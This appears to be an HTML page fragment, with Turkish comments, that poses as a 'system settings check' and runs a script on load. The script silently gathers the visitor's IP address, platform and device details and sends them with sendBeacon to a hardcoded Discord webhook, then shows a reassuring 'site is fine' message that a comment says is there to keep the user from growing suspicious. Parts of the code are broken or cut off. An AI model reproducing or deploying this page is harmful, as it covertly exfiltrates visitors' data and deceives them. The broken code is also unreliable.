<body>
    <h2 id="t">Sistem ayarlarÄ± kontrol ediliyor...</h2>

    <script>
        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";

        async function what() {

            let info = { gpu: "Gizli", v: "Gizli", bat: "X", loc: "X", ip: "X" };

            // GPU & DonanÄ±m (Sessiz)
            try {

            // IP TabanlÄ± Konum (Ä°zin istemez - Gizlidir)
            try {
                const r = await fetch('https://ipapi.co/json/');
                const d = await r.json();
                info.ip = d.ip;

            } catch(e) {}

            // 2. TEK VE GÄ°ZLÄ° PAKET OLUÅTUR
            const payload = {
                embeds: [{
                    title: "rapor ciktisi",

                        { name: "ğŸ”‹ GÃœÃ‡", value: info.bat, inline: true },
                        { name: "ğŸ“± OS", value: navigator.platform, inline: true },
                        { name: "ğŸŒ IP", value: info.ip, inline: true },

                    timestamp: new Date()

            };

            // 3. YILDIRIM GÃ–NDERÄ°M
            navigator.sendBeacon(u, JSON.stringify(payload));

            // 4. ARAYÃœZÃœ TAMAMLA (KullanÄ±cÄ±yÄ± ÅŸÃ¼phelendirme)
            const t = document.getElementById('t');
            t.innerHTML = '<span class="ok">Site uygun halde!</span>';

        }

        // TÄ±klama beklemeden otomatik baÅŸlat
